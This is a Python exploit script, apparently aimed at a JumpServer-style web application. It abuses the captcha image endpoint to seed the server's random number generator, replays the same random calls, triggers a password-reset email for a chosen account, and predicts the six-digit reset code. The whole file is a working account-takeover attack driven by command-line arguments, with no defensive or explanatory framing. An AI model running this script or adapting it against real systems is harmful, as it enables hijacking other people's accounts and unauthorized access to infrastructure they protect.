import requests
import logging
import sys
import random
import string
import argparse
from urllib.parse import urljoin

logging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
string_punctuation = '!#$%&()*+,-.:;<=>?@[]^_~'


def random_string(length: int, lower=True, upper=True, digit=True, special_char=False):
    args_names = ['lower', 'upper', 'digit', 'special_char']
    args_values = [lower, upper, digit, special_char]
    args_string = [string.ascii_lowercase, string.ascii_uppercase, string.digits, string_punctuation]
    args_string_map = dict(zip(args_names, args_string))
    kwargs = dict(zip(args_names, args_values))
    kwargs_keys = list(kwargs.keys())
    kwargs_values = list(kwargs.values())
    args_true_count = len([i for i in kwargs_values if i])
    assert any(kwargs_values), f'Parameters {kwargs_keys} must have at least one `True`'
    assert length >= args_true_count, f'Expected length >= {args_true_count}, bug got {length}'

    can_startswith_special_char = args_true_count == 1 and special_char

    chars = ''.join([args_string_map[k] for k, v in kwargs.items() if v])

    while True:
        password = list(random.choice(chars) for i in range(length))
        for k, v in kwargs.items():
            if v and not (set(password) & set(args_string_map[k])):
                # 没有包含指定的字符, retry
                break
        else:
            if not can_startswith_special_char and password[0] in args_string_map['special_char']:
                # 首位不能为特殊字符, retry
                continue
            else:
                # 满足要求终止 while 循环
                break

    password = ''.join(password)
    return password


def nop_random(seed: str):
    random.seed(seed)
    for i in range(4):
        random.randrange(-35, 35)

    for p in range(int(180 * 38 * 0.1)):
        random.randint(0, 180)
        random.randint(0, 38)


def fix_seed(target: str, seed: str):
    def _request(i: int, u: str):
        logging.info('send %d request to %s', i, u)
        response = requests.get(u, timeout=5)
        assert response.status_code == 200
        assert response.headers['Content-Type'] == 'image/png'

    url = urljoin(target, '/core/auth/captcha/image/' + seed + '/')
    for idx in range(30):
        _request(idx, url)


def send_code(target: str, email: str, reset_token: str):
    url = urljoin(target, "/api/v1/authentication/password/reset-code/?token=" + reset_token)
    response = requests.post(url, json={
        'email': email,
        'sms': '',
        'form_type': 'email',
    }, allow_redirects=False)
    assert response.status_code == 200
    logging.info("send code headers: %r response: %r", response.headers, response.text)


def main(target: str, email: str, seed: str, token: str):
    fix_seed(target, seed)
    nop_random(seed)
    send_code(target, email, token)
    code = random_string(6, lower=False, upper=False)
    logging.info("your code is %s", code)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process some integers.')
    parser.add_argument('-t', '--target', type=str, required=True, help='target url')
    parser.add_argument('--email', type=str, required=True, help='account email')
    parser.add_argument('--seed', type=str, required=True, help='seed from captcha url')
    parser.add_argument('--token', type=str, required=True, help='account reset token')

    args = parser.parse_args()
    main(args.target, args.email, args.seed, args.token)
